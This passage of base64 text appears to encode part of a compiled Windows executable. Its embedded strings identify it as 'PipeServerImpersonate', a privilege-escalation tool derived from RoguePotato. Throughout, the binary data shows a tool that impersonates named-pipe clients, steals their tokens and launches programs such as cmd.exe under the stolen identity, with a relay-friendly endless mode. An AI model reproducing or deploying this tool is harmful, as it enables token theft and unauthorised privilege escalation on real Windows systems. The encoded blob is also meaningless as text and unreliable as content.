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kAbABlAGcAZQAAAAAAWwAtAF0AIABBACAAcAByAGkAdgBpAGwAZQBnAGUAIABpAHMAIABtAGkAcwBzAGkAbgBnADoAIAAnACUAdwBzACcALgAgAEUAeABpAHQAaQBuAGcAIAAuAC4ALgAKAAAAXABcAC4AXABwAGkAcABlAFwAJQBTAAAAAAAAAAAAAAAKCglQaXBlU2VydmVySW1wZXJzb25hdGUKCUBzaGl0c2VjdXJlLCBjb2RlIHN0b2xlbiBmcm9tIEBzcGxpbnRlcl9jb2RlJ3MgJiYgQGRlY29kZXJfaXQncyBSb2d1ZVBvdGF0byAoaHR0cHM6Ly9naXRodWIuY29tL2FudG9uaW9Db2NvL1JvZ3VlUG90YXRvKSAKCgoAAAAAAAAAAAAATWFuZGF0b3J5IGFyZ3M6IAotZSBjb21tYW5kbGluZTogY29tbWFuZGxpbmUgb2YgdGhlIHByb2dyYW0gdG8gbGF1bmNoCgAACgoAAAAAAABPcHRpb25hbCBhcmdzOiAKLXAgcGlwZW5hbWVfcGxhY2Vob2xkZXI6IHBsYWNlaG9sZGVyIHRvIGJlIHVzZWQgaW4gdGhlIHBpcGUgbmFtZSBjcmVhdGlvbiAoZGVmYXVsdDogUGlwZVNlcnZlckltcGVyc29uYXRlKQoteiA6IHRoaXMgZmxhZyB3aWxsIHJhbmRvbWl6ZSB0aGUgcGlwZW5hbWVfcGxhY2Vob2xkZXIgKGRvbid0IHVzZSB3aXRoIC1wKQotYSA6IGFyZ3VtZW50cyB0byBydW4gdGhlIGJpbmFyeSB3aXRoCi1uIDogZW5kbGVzcyBtb2RlIC0gcmVzdGFydCB0aGUgTmFtZWQgUGlwZSBTZXJ2ZXIgYWZ0ZXIgZXhlY3V0aW9uIC0gY2FuIGJlIHVzZWQgaW4gY29tYmluYXRpb24gd2l0aCBOZXROVExNdjIgcmVsYXlpbmcuCgAAAAAAAAAAAAAAAEV4YW1wbGUgdG8gZXhlY3V0ZSBjbWQuZXhlIGFuZCBjcmVhdGUgYSBuYW1lZCBwaXBlIG5hbWVkIHRlc3RwaXBlczogCglQaXBlU2VydmVySW1wZXJzb25hdGUuZXhlIC1lICJDOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUiIC1wIHRlc3RwaXBlcwoAAFstXSBFcn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